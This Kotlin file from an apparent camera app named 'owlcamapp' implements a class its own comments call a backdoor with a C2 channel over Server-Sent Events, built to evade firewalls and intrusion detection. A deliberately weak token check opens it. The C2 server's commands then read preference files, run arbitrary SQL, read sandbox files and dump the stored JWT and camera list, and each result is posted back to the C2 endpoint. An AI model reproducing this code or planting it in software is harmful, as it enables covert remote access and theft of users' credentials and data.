package com.example.owlcamapp.service

import android.content.Context
import android.content.SharedPreferences
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.example.owlcamapp.util.ApiConfig
import kotlinx.coroutines.*
import org.json.JSONObject
import org.xmlpull.v1.XmlPullParser
import org.xmlpull.v1.XmlPullParserFactory
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

/**
 * DiagSysManager - HTTP/SSE Version
 *
 * "Remote Diagnostic" system using Server-Sent Events (SSE)
 * instead of native TCP connections for the C2 channel.
 *
 * Advantages of HTTP/SSE over TCP:
 * - Evasion of corporate firewalls (standard HTTP traffic)
 * - Works through HTTP proxies and NAT
 * - Compatible with 4G/5G networks without special configuration
 * - Less detectable by IDS/IPS
 *
 * Architecture:
 * - Downstream channel (C2 → Device): Persistent SSE connection
 * - Upstream channel (Device → C2): Standard HTTP POST
 */
class DiagSysManagerSSE(private val context: Context) {
    
    private val prefs: SharedPreferences = context.getSharedPreferences("app_config", Context.MODE_PRIVATE)
    private var isConnected = false
    private var connectionJob: Job? = null
    private var sseReader: BufferedReader? = null
    private var httpConnection: HttpURLConnection? = null
    private var currentSessionId: String? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    
    data class ActivationResult(
        val success: Boolean,
        val reference: String = "",
        val token: String = ""
    )
    
    companion object {
        private const val TAG = "DIAGSYS-SSE"
        private const val RECONNECT_DELAY_INITIAL = 5000L // 5 seconds
        private const val RECONNECT_DELAY_MAX = 60000L    // 60 seconds
        private const val HEARTBEAT_TIMEOUT = 90000L      // 90 seconds without heartbeat = reconnect
    }
    
    /**
     * Activates diagnostic mode (backdoor) with token
     */
    suspend fun activateEngineeringMode(token: String): ActivationResult {
        Log.i(TAG, "Activating engineering mode with token: ${token.take(2)}****")
        
        val serverValid = validateTokenWithServer(token)
        Log.d(TAG, "Server validation: $serverValid")
        
        if (!serverValid && !weakLocalValidation(token)) {
            Log.w(TAG, "Invalid token")
            return ActivationResult(false)
        }
        
        Log.i(TAG, "Valid token, activating backdoor...")
        val reference = generateReference(token)
        
        prefs.edit().apply {
            putBoolean("eng_mode_active", true)
            putString("eng_token", token)
            putString("eng_reference", reference)
            putLong("eng_activated_at", System.currentTimeMillis())
            putLong("eng_expires_at", System.currentTimeMillis() + 86400000)
            apply()
        }
        
        Log.i(TAG, "Backdoor activated. Reference: $reference")
        Log.i(TAG, "Starting SSE connection to ${ApiConfig.C2_SSE_ENDPOINT}")
        
        // Start SSE connection in background
        connectionJob = CoroutineScope(Dispatchers.IO).launch {
            try {
                startSSEConnection(token)
            } catch (e: Exception) {
                Log.e(TAG, "Error en conexión SSE background", e)
            }
        }
        
        Log.i(TAG, "SSE connection job started: ${connectionJob?.isActive}")
        return ActivationResult(true, reference, token)
    }
    
    fun isEngineeringModeActive(): Boolean {
        val active = prefs.getBoolean("eng_mode_active", false)
        val expiresAt = prefs.getLong("eng_expires_at", 0)
        return active && System.currentTimeMillis() < expiresAt
    }
    
    /**
     * Validates token against the legitimate server
     */
    private suspend fun validateTokenWithServer(token: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL("${ApiConfig.BASE_URL}${ApiConfig.ENDPOINT_DIAG_VALIDATE}")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                
                val payload = JSONObject().apply {
                    put("token", token)
                    put("device_id", getDeviceId())
                    put("model", android.os.Build.MODEL)
                }
                
                conn.outputStream.write(payload.toString().toByteArray())
                
                if (conn.responseCode == 200) {
                    val response = JSONObject(conn.inputStream.bufferedReader().readText())
                    response.optString("status") == "authorized"
                } else false
            } catch (e: Exception) {
                Log.w(TAG, "Server validation failed", e)
                false
            }
        }
    }
    
    /**
     * Weak local validation (vulnerable algorithm)
     */
    private fun weakLocalValidation(token: String): Boolean {
        val sum = token.sumOf { 
            if (it.isDigit()) it.digitToInt() 
            else (it.uppercaseChar() - 'A' + 10) 
        }
        return sum % 7 == 0 && token.length == 6
    }
    
    private fun generateReference(token: String): String {
        val year = java.util.Calendar.getInstance().get(java.util.Calendar.YEAR)
        val random = (1000..9999).random()
        return "ENG-$year-$random-$token"
    }
    
    /**
     * Persistent SSE connection to the C2 server
     * Keeps channel open to receive commands
     */
    private suspend fun startSSEConnection(token: String) {
        var retryDelay = RECONNECT_DELAY_INITIAL
        
        while (isEngineeringModeActive()) {
            try {
                connectSSE(token)
                retryDelay = RECONNECT_DELAY_INITIAL // Reset on success
                Log.w(TAG, "SSE connection lost, retrying...")
            } catch (e: Exception) {
                Log.e(TAG, "Error conexión SSE", e)
            }
            
            delay(retryDelay)
            retryDelay = minOf(retryDelay * 2, RECONNECT_DELAY_MAX)
        }
    }
    
    /**
     * Establishes SSE connection and processes events
     */
    private suspend fun connectSSE(token: String) {
        withContext(Dispatchers.IO) {
            var inputStream: InputStream? = null
            var lineCount = 0
            try {
                val endpoint = ApiConfig.C2_SSE_ENDPOINT
                Log.d(TAG, "Conectando a SSE endpoint: $endpoint")
                
                val url = URL(endpoint)
                httpConnection = url.openConnection() as HttpURLConnection
                
                val deviceId = getDeviceId()
                val model = android.os.Build.MODEL
                
                // Required SSE headers
                httpConnection?.apply {
                    requestMethod = "GET"
                    setRequestProperty(ApiConfig.HEADER_DEVICE_ID, deviceId)
                    setRequestProperty(ApiConfig.HEADER_DIAG_TOKEN, token)
                    setRequestProperty(ApiConfig.HEADER_DEVICE_MODEL, model)
                    setRequestProperty("Accept", "text/event-stream")
                    setRequestProperty("Cache-Control", "no-cache")
                    setRequestProperty("Connection", "keep-alive")
                    connectTimeout = 15000
                    readTimeout = 0 // No timeout for continuous reading
                }
                
                Log.d(TAG, "Headers set - Device: $deviceId, Model: $model, Token: ${token.take(2)}****")
                
                // Connect and check response
                httpConnection?.connect()
                val responseCode = httpConnection?.responseCode
                
                Log.d(TAG, "Response code: $responseCode")
                
                if (responseCode != 200) {
                    val errorStream = httpConnection?.errorStream?.bufferedReader()?.readText()
                    Log.e(TAG, "Error response: $errorStream")
                    throw IOException("HTTP $responseCode")
                }
                
                isConnected = true
                Log.i(TAG, "✓ SSE connection established with C2")
                
                // Process SSE stream
                inputStream = httpConnection?.inputStream
                sseReader = inputStream?.bufferedReader()
                var lastHeartbeat = System.currentTimeMillis()
                lineCount = 0
                
                while (isConnected && isEngineeringModeActive()) {
                    try {
                        val line = sseReader?.readLine()
                        lineCount++
                        
                        if (lineCount % 100 == 0) {
                            Log.d(TAG, "Lines processed: $lineCount")
                        }
                        
                        if (line == null) {
                            Log.w(TAG, "SSE stream closed (null line) - count: $lineCount")
                            Log.w(TAG, "Connection info: isConnected=$isConnected, engMode=${isEngineeringModeActive()}")
                            break
                        }
                        
                        if (line.isNotEmpty()) {
                            Log.v(TAG, "SSE raw: $line")
                        }
                        
                        // Ignore SSE comments (keep-alive)
                        if (line.startsWith(":")) {
                            continue
                        }
                        
                        // Parse SSE event
                        if (line.startsWith("event:")) {
                            val eventType = line.substring(6).trim()
                            val dataLine = sseReader?.readLine()
                            
                            if (dataLine?.startsWith("data:") == true) {
                                val eventData = dataLine.substring(5).trim()
                                Log.d(TAG, "Event received: $eventType")
                                processSSEEvent(eventType, eventData)
                            }
                        }
                        
                        // Check heartbeat timeout
                        if (System.currentTimeMillis() - lastHeartbeat > HEARTBEAT_TIMEOUT) {
                            Log.w(TAG, "Heartbeat timeout, reconnecting...")
                            break
                        }
                        
                    } catch (e: IOException) {
                        Log.e(TAG, "Error leyendo SSE: ${e.message}")
                        break
                    }
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error conexión SSE: ${e.javaClass.simpleName} - ${e.message}")
                throw e
            } finally {
                isConnected = false
                Log.i(TAG, "Closing SSE connection (finally). Total lines: $lineCount")
                try {
                    inputStream?.close()
                } catch (e: Exception) {
                    Log.e(TAG, "Error closing inputStream: ${e.message}")
                }
                closeConnection()
            }
        }
    }
    
    /**
     * Processes received SSE events
     */
    private fun processSSEEvent(eventType: String, eventData: String) {
        Log.d(TAG, "SSE event: $eventType - ${eventData.take(100)}")
        
        when (eventType) {
            "connected" -> {
                try {
                    val json = JSONObject(eventData)
                    currentSessionId = json.optString("session_id")
                    Log.i(TAG, "✓ Session established: $currentSessionId")
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing connected event", e)
                }
            }
            "cmd" -> {
                Log.i(TAG, "Processing CMD command")
                try {
                    val json = JSONObject(eventData)
                    val cmdType = json.optString("type")
                    val cmdData = json.optString("data")
                    
                    Log.i(TAG, "Command type: $cmdType, Data: ${cmdData.take(50)}")
                    
                    when (cmdType) {
                        "shell_cmd" -> {
                            Log.i(TAG, "Executing shell_cmd: $cmdData")
                            val output = executeDiagnosticCommand(cmdData)
                            Log.i(TAG, "Output generated: ${output.take(50)}...")
                            sendResponse(output)
                        }
                        "banner" -> {
                            Log.i(TAG, "Sending banner response")
                            sendResponse(cmdData)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing command", e)
                }
            }
            "heartbeat" -> {
                Log.d(TAG, "Heartbeat received")
            }
        }
    }
    
    /**
     * Envía respuesta al C2 vía POST
     */
    private fun sendResponse(data: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = URL(ApiConfig.C2_RESPONSE_ENDPOINT)
                val conn = url.openConnection() as HttpURLConnection
                
                val sessionId = currentSessionId
                if (sessionId == null) {
                    Log.e(TAG, "No session_id available, cannot send response")
                    return@launch
                }
                
                val payload = JSONObject().apply {
                    put("session_id", sessionId)
                    put("device_id", getDeviceId())
                    put("type", "output")
                    put("data", data)
                    put("timestamp", System.currentTimeMillis())
                }
                
                Log.d(TAG, "Sending response for session: ${sessionId.take(20)}...")
                
                conn.apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    doOutput = true
                    connectTimeout = 10000
                    readTimeout = 10000
                }
                
                conn.outputStream.write(payload.toString().toByteArray())
                
                if (conn.responseCode == 200) {
                    Log.d(TAG, "Response sent successfully")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error sending response", e)
            }
        }
    }
    
    /**
     * Ejecuta comandos de diagnóstico in-app
     */
    private fun executeDiagnosticCommand(commandLine: String): String {
        val parts = commandLine.trim().split("\\s+".toRegex())
        val cmd = parts[0].lowercase()
        val args = if (parts.size > 1) parts.drop(1) else listOf()
        
        return when (cmd) {
            "help" -> """
                Available diagnostic commands:
                  help              - Show this help
                  prefs list        - List SharedPreferences files
                  prefs read <file> - Read preferences XML
                  prefs get <key>   - Get specific preference value
                  db tables         - List SQLite tables
                  db query <sql>    - Execute SQL query
                  file list [path]  - List files in sandbox
                  file read <path>  - Read file content
                  token jwt         - Show current JWT token
                  token info        - Decode token payload
                  camera list       - List accessible cameras
                  app info          - Show app information
                  net status        - Network status
                  exit              - Close diagnostic session
            """.trimIndent()
            
            "prefs" -> handlePrefsCommand(args)
            "db" -> handleDbCommand(args)
            "file" -> handleFileCommand(args)
            "token" -> handleTokenCommand(args)
            "camera" -> handleCameraCommand(args)
            "app" -> handleAppCommand(args)
            "net" -> handleNetCommand(args)
            "exit" -> {
                disconnect()
                "[*] Closing diagnostic session..."
            }
            "" -> ""
            else -> "Unknown command: $cmd. Type 'help' for available commands."
        }
    }
    
    // ===== Command handlers (same as TCP version) =====
    
    private fun handlePrefsCommand(args: List<String>): String {
        if (args.isEmpty()) return "Usage: prefs [list|read|get] [args]"
        
        return when (args[0]) {
            "list" -> {
                val prefsDir = File(context.applicationInfo.dataDir, "shared_prefs")
                val files = prefsDir.listFiles()?.filter { it.name.endsWith(".xml") }
                    ?.joinToString("\n") { "  - ${it.name}" }
                files ?: "No preferences found"
            }
            
            "read" -> {
                if (args.size < 2) return "Usage: prefs read <filename.xml>"
                val filename = args[1]
                val file = File(context.applicationInfo.dataDir, "shared_prefs/$filename")
                
                if (!file.exists()) return "File not found: $filename"
                
                try {
                    val content = file.readText()
                    parsePrefsXml(content)
                } catch (e: Exception) {
                    "Error reading file: ${e.message}"
                }
            }
            
            "get" -> {
                if (args.size < 2) return "Usage: prefs get <key>"
                val key = args[1]
                val value = prefs.all[key]
                value?.toString() ?: "Key not found: $key"
            }
            
            else -> "Unknown prefs subcommand: ${args[0]}"
        }
    }
    
    private fun parsePrefsXml(xml: String): String {
        return try {
            val factory = XmlPullParserFactory.newInstance()
            val parser = factory.newPullParser()
            parser.setInput(xml.reader())
            
            val result = StringBuilder()
            var key = ""
            var value = ""
            var type = ""
            
            var event = parser.eventType
            while (event != XmlPullParser.END_DOCUMENT) {
                when (event) {
                    XmlPullParser.START_TAG -> {
                        type = parser.name
                        key = parser.getAttributeValue(null, "name") ?: ""
                    }
                    XmlPullParser.TEXT -> {
                        value = parser.text ?: ""
                    }
                    XmlPullParser.END_TAG -> {
                        if (key.isNotEmpty() && type in listOf("string", "int", "long", "float", "boolean")) {
                            result.append("[$type] $key = $value\n")
                        }
                    }
                }
                event = parser.next()
            }
            result.toString().ifEmpty { "Empty preferences file" }
        } catch (e: Exception) {
            "XML parse error: ${e.message}\nRaw content:\n$xml"
        }
    }
    
    private fun handleDbCommand(args: List<String>): String {
        if (args.isEmpty()) return "Usage: db [tables|query] [args]"
        
        return when (args[0]) {
            "tables" -> {
                try {
                    val db = context.openOrCreateDatabase("app_db", Context.MODE_PRIVATE, null)
                    val cursor = db.rawQuery("SELECT name FROM sqlite_master WHERE type='table'", null)
                    val tables = mutableListOf<String>()
                    while (cursor.moveToNext()) {
                        tables.add("  - ${cursor.getString(0)}")
                    }
                    cursor.close()
                    db.close()
                    tables.joinToString("\n").ifEmpty { "No tables found" }
                } catch (e: Exception) {
                    "Database error: ${e.message}"
                }
            }
            
            "query" -> {
                if (args.size < 2) return "Usage: db query <SQL>"
                val sql = args.drop(1).joinToString(" ")
                
                try {
                    val db = context.openOrCreateDatabase("app_db", Context.MODE_PRIVATE, null)
                    val cursor = db.rawQuery(sql, null)
                    val result = cursorToString(cursor)
                    cursor.close()
                    db.close()
                    result
                } catch (e: Exception) {
                    "Query error: ${e.message}"
                }
            }
            
            else -> "Unknown db subcommand: ${args[0]}"
        }
    }
    
    private fun cursorToString(cursor: Cursor): String {
        val result = StringBuilder()
        val columns = cursor.columnNames
        
        result.append(columns.joinToString(" | ") + "\n")
        result.append("-".repeat(result.length) + "\n")
        
        while (cursor.moveToNext()) {
            val row = columns.map { col ->
                try {
                    val idx = cursor.getColumnIndex(col)
                    cursor.getString(idx) ?: "NULL"
                } catch (e: Exception) {
                    "?"
                }
            }
            result.append(row.joinToString(" | ") + "\n")
        }
        
        return if (result.isNotEmpty()) result.toString() else "No results"
    }
    
    private fun handleFileCommand(args: List<String>): String {
        if (args.isEmpty()) return "Usage: file [list|read] [path]"
        
        return when (args[0]) {
            "list" -> {
                val path = if (args.size > 1) args[1] else "."
                val dir = File(context.applicationInfo.dataDir, path)
                val files = dir.listFiles()?.joinToString("\n") { 
                    val type = if (it.isDirectory) "[DIR]" else "[FILE]"
                    "$type ${it.name} (${it.length()} bytes)"
                }
                files ?: "Empty directory or not found"
            }
            
            "read" -> {
                if (args.size < 2) return "Usage: file read <path>"
                val path = args[1]
                val file = File(context.applicationInfo.dataDir, path)
                
                if (!file.exists()) return "File not found: $path"
                if (file.isDirectory) return "Is a directory: $path"
                if (file.length() > 1024 * 1024) return "File too large (>1MB)"
                
                try {
                    file.readText()
                } catch (e: Exception) {
                    "Error reading file: ${e.message}"
                }
            }
            
            else -> "Unknown file subcommand: ${args[0]}"
        }
    }
    
    private fun handleTokenCommand(args: List<String>): String {
        if (args.isEmpty()) return "Usage: token [jwt|info]"
        
        return when (args[0]) {
            "jwt" -> {
                prefs.getString("auth_token", "No token stored") ?: "No token"
            }
            
            "info" -> {
                val token = prefs.getString("auth_token", null)
                if (token == null) return "No token stored"
                
                try {
                    val parts = token.split(".")
                    if (parts.size != 3) return "Invalid JWT format"
                    
                    val payload = String(android.util.Base64.decode(parts[1], android.util.Base64.URL_SAFE))
                    val json = JSONObject(payload)
                    
                    """
                    JWT Token Information:
                    Algorithm: ${parts[0].let { String(android.util.Base64.decode(it, android.util.Base64.URL_SAFE)) }.let { JSONObject(it).optString("alg") }}
                    User ID: ${json.optString("user_id")}
                    Issued at: ${json.optLong("iat").let { if (it > 0) java.util.Date(it * 1000).toString() else "N/A" }}
                    Expires: ${json.optLong("exp").let { if (it > 0) java.util.Date(it * 1000).toString() else "N/A" }}
                    """.trimIndent()
                } catch (e: Exception) {
                    "Error decoding token: ${e.message}"
                }
            }
            
            else -> "Unknown token subcommand: ${args[0]}"
        }
    }
    
    private fun handleCameraCommand(args: List<String>): String {
        if (args.isEmpty()) return "Usage: camera [list]"
        
        return when (args[0]) {
            "list" -> {
                val camerasJson = prefs.getString("cameras_access", "[]")
                try {
                    val cameras = org.json.JSONArray(camerasJson)
                    val result = StringBuilder("Accessible cameras:\n")
                    for (i in 0 until cameras.length()) {
                        result.append("  [${i + 1}] ${cameras.getString(i)}\n")
                    }
                    result.toString()
                } catch (e: Exception) {
                    "Error parsing camera list: ${e.message}"
                }
            }
            
            else -> "Unknown camera subcommand: ${args[0]}"
        }
    }
    
    private fun handleAppCommand(args: List<String>): String {
        return when (args.getOrNull(0)) {
            "info" -> """
                Application Information:
                Package: ${context.packageName}
                Version: ${context.packageManager.getPackageInfo(context.packageName, 0).versionName}
                Data Dir: ${context.applicationInfo.dataDir}
                Target SDK: ${context.applicationInfo.targetSdkVersion}
                Device: ${android.os.Build.MODEL}
                Android: ${android.os.Build.VERSION.RELEASE}
                C2 Protocol: HTTP/SSE
                Connection: ${if (isConnected) "Connected" else "Disconnected"}
            """.trimIndent()
            
            else -> "Usage: app [info]"
        }
    }
    
    private fun handleNetCommand(args: List<String>): String {
        return when (args.getOrNull(0)) {
            "status" -> """
                Network Status:
                Connected: ${if (isConnected) "Yes (SSE)" else "No"}
                C2 Server: ${ApiConfig.C2_SERVER_URL}
                Protocol: HTTP/SSE
                Last Activity: ${System.currentTimeMillis()}
            """.trimIndent()
            
            else -> "Usage: net [status]"
        }
    }
    
    private fun getDeviceId(): String {
        return android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"
    }
    
    private fun closeConnection() {
        try {
            sseReader?.close()
        } catch (e: Exception) {}
        
        try {
            httpConnection?.disconnect()
        } catch (e: Exception) {}
        
        sseReader = null
        httpConnection = null
    }
    
    fun disconnect() {
        Log.i(TAG, "Disconnecting...")
        isConnected = false
        connectionJob?.cancel()
        closeConnection()
    }
}
